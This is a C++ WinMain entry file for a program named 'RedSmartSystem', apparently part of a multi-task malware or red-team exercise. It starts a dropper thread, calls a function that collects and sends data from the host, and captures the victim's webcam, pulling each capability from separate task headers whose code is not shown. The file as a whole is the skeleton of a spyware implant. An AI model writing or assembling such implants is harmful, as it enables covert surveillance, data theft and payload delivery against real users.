#include <windows.h>
#include <fstream>
#include <string>
#include <gdiplus.h>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "windowscodecs.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mfuuid.lib")
#pragma comment(lib, "ole32.lib")

using namespace Gdiplus;

#include "../Task 1/dropper.h"
#include "../Task 2/recon.h"
#include "../Task 3/camera.h"

static void LogMainDebug(const char* msg) {
    std::ofstream ofs("debug_log.txt", std::ios::app);
    if (ofs.is_open()) ofs << "[Main] " << msg << std::endl;
}

extern DWORD WINAPI DropperThread(LPVOID lpParam);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    LogMainDebug("--- RedSmartSystem Started ---");

    ULONG_PTR gdiplusToken = 0;
    GdiplusStartupInput gdiplusStartupInput;
    if (GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Ok) {
        LogMainDebug("GdiplusStartup failed to initialize.");
        gdiplusToken = 0;
    }

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        LogMainDebug("CoInitializeEx failed.");
    } else {
        CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    }

    HANDLE hThread = CreateThread(NULL, 0, DropperThread, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);

    CollectAndSendData();

    if (CaptureWebcam()) {
        LogMainDebug("CaptureWebcam returned Success!");
    } else {
        LogMainDebug("CaptureWebcam returned Failure.");
    }

    if (SUCCEEDED(hr)) CoUninitialize();
    
    if (gdiplusToken) GdiplusShutdown(gdiplusToken);

    LogMainDebug("--- RedSmartSystem Finished ---");
    return 0;
}
